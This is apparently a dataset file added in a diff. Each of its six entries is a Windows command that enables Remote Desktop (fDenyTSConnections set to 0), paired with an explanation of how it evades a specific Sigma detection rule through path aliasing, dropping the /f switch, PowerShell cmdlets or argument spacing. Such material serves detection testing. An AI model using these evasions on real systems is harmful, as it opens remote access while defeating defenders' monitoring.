@@ -1,0 +1,26 @@
+[
+  {
+    "output": "reg.exe add \"HKLM\\SYSTEM\\ControlSet001\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+    "explanation": "The Sigma rule statically looks for the exact string \"\\CurrentControlSet\\Control\\Terminal Server\". Windows maps \"CurrentControlSet\" to a numbered control set like \"ControlSet001\". By targeting ControlSet001 directly, the command modifies the exact same RDP configuration while evading the specific path string match."
+  },
+  {
+    "output": "echo Y | reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0",
+    "explanation": "The detection explicitly requires the ' /f' switch (force) to be present in the command line. An attacker can omit the '/f' flag and instead pipe 'Y' (Yes) to standard input to silently answer the overwrite confirmation prompt, bypassing the ' /f' string condition entirely."
+  },
+  {
+    "output": "Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\" -Name \"fDenyTSConnections\" -Value 0 -Type DWord",
+    "explanation": "The rule is strictly tied to the execution of the 'reg.exe' binary (checked via Image or OriginalFileName). Using native PowerShell cmdlets to modify the registry completely evades the 'selection_main_img' condition while achieving the exact same result."
+  },
+  {
+    "output": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0/f",
+    "explanation": "The rule specifically looks for ' /f' with a leading space. By placing the '/f' switch immediately adjacent to the data value (e.g., '0/f' instead of '0 /f'), the reg.exe parser still successfully interprets the force switch, but the command string fails to match the Sigma rule's spaced condition."
+  },
+  {
+    "output": "echo Y | reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0",
+    "explanation": "The detection logic strictly requires the ' /f' flag (with a leading space) in the command line to match. By completely omitting the '/f' parameter and piping the 'Y' character to automatically accept the overwrite confirmation prompt, the registry key is modified successfully while breaking the 'selection_main_cli' 'contains|all' condition."
+  },
+  {
+    "output": "reg.exe add \"HKLM\\SYSTEM\\ControlSet001\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+    "explanation": "The rule explicitly searches for the literal string '\\CurrentControlSet\\Control\\Terminal Server'. In the Windows Registry, 'CurrentControlSet' is merely a dynamic pointer to a numbered control set (most commonly 'ControlSet001'). By explicitly targeting 'ControlSet001', the static string requirement fails to match while achieving the exact same system configuration change."
+  }
+]
